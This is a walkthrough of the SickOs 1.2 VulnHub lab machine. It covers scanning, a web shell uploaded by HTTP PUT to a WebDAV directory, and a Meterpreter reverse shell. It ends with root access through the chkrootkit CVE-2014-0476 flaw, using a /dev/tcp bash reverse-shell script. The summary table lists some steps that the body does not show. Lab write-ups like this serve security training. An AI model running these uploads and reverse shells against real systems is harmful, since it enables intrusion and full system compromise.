# SickOs-1.2
SickOs 1.2 - VulnHub Walkthrough
This is a walkthrough of the SickOs 1.2 machine from VulnHub. It’s the sequel to SickOs 1.1, and it's both more challenging and more realistic, simulating situations one might encounter during a real-world penetration test.

**🔍 Discovery**
After downloading and running the machine, we see that it was assigned the IP 192.168.2.4. A port scan using nmap reveals ports 80 (HTTP) and 22 (SSH) open.
**>Target IP: 192.168.2.4**
**>Initial Scan:**
<pre>
nmap -A -T5 192.168.2.4
root@kali:~/sickos2# nmap -A -T5 192.168.2.4

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
| 2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_ 256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open http lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
OS details: Linux 3.2 - 4.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>
**Open Ports:**

**22/tcp:** SSH (OpenSSH 5.9p1)
**80/tcp:** HTTP (lighttpd 1.4.28)

**🌐 Web Enumeration**
We open a web browser, browse to http://192.168.2.4 and see the following page

The usage of **dirb** reveals the listable directory **/test.**
<pre>
root@kali:~/sickos2# dirb http://192.168.2.4
---- Scanning URL: http://192.168.2.4/ ----
+ http://192.168.2.4/index.php (CODE:200|SIZE:163) 
==> DIRECTORY: http://192.168.2.4/test/

/index.php
/test/   ← Listable directory
</pre>

**WebDAV Detection**

Making a HTTP OPTIONS request on this path shows that **/test** looks like a WebDAV directory.

<pre>
root@kali:~/sickos2# curl --head -X OPTIONS 192.168.2.4/test/
HTTP/1.1 200 OK
DAV: 1,2
MS-Author-Via: DAV
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Allow: OPTIONS, GET, HEAD, POST
Content-Length: 0
Date: Thu, 15 Jun 2024 16:32:35 GMT
Server: lighttpd/1.4.28
</pre>
Supports PUT, confirming WebDAV is enabled.

**🛠 Exploitation (Web Shell Upload)**
We also note that the web server seems to accept HTTP PUT requests. The PUT method should allow us to upload arbitrary files on the web server. Let’s try it out. We create a file named **shell.php** containing the following code:
<pre>
<?php
echo shell_exec("id");
?>
</pre>

Upload using:
<pre>
  curl -v -X PUT -H "Expect: " 192.168.2.4/test/shell.php -d@shell.php
</pre>
Browse to /test/shell.php to confirm code execution as www-data.

**🧠 Reverse Shell with Meterpreter**

Now that we know we can upload arbitrary PHP scripts and execute them, let’s try to spawn a shell on the machine. We use msfvenom to generate the appropriate payload.
<pre>
  root@kali:~/sickos2# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.2.3 LPORT=4444 > shell.php
</pre>
Note that 192.168.2.3 is the IP of our Kali box, where we will listen for the incoming reverse shell. Using the same command as before, we start by uploading this script on the server.
<pre
root@kali:~/sickos2# curl -v -X PUT -H "Expect: " 192.168.2.4/test/shell.php -d@shell.php
</pre>

Start **Metasploit listener**:
To catch our reverse shell.
<pre>

root@kali:~/sickos2# msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set LHOST 192.168.2.3
LHOST => 192.168.2.3
msf exploit(handler) > set LPORT 4444
LPORT => 4444
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.2.3:4444 
[*] Starting the payload handler...

</pre>

Then, from another terminal, we trigger the PHP script that will connect back to our attacking machine.
<pre
  root@kali:~/sickos2# curl 192.168.2.4/test/shell.php
  > ls
execute.php
shell.php
> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>

**📈 Privilege Escalation**
Check installed packages:**chkrootkit** is present (v0.49)

Vulnerable to **CVE-2014-0476**

Exploiting CVE-2014-0476
Write to /tmp/update:
<pre>
#!/bin/bash
bash -i >& /dev/tcp/192.168.2.3/443 0>&1
</pre>  
Make it executable:
<pre
  chmod +x /tmp/update
</pre>
Start listener:
<pre>
  nc -lvp 443
</pre>
Since chkrootkit seems to only run daily, we expect to have to wait until the next day to obtain a root shell. Surprisingly, it comes to us after a few minutes like an early Christmas present
We can now get the flag, located in the /root directory.
**🏁 Getting the Flag**
<pre>
  cat /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
</pre>
**🔐 Firewall Rules (/root/newRule)**
<pre>
  INPUT: DROP (only allows ports 22, 80)
OUTPUT: DROP (allows outbound 443, 8080)
</pre>
**⏱ Chkrootkit Cron Schedule**
Despite being in /etc/cron.daily/, it also exists in:
<pre>
/etc/cron.d/chkrootkit  
</pre>

<pre>
**Summary**
| Phase           | Technique Used                               |
| --------------- | -------------------------------------------- |
| Enumeration     | Nmap, Dirb, WebDAV detection                 |
| Initial Access  | PUT PHP file upload                          |
| Reverse Shell   | Meterpreter + Netcat fallback                |
| Firewall Bypass | Netcat-based port scanning                   |
| PrivEsc         | CVE-2014-0476 via chkrootkit & cron abuse    |
| Root Access     | Netcat listener + shell script               |
| Flag            | `/root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt` |

</pre>












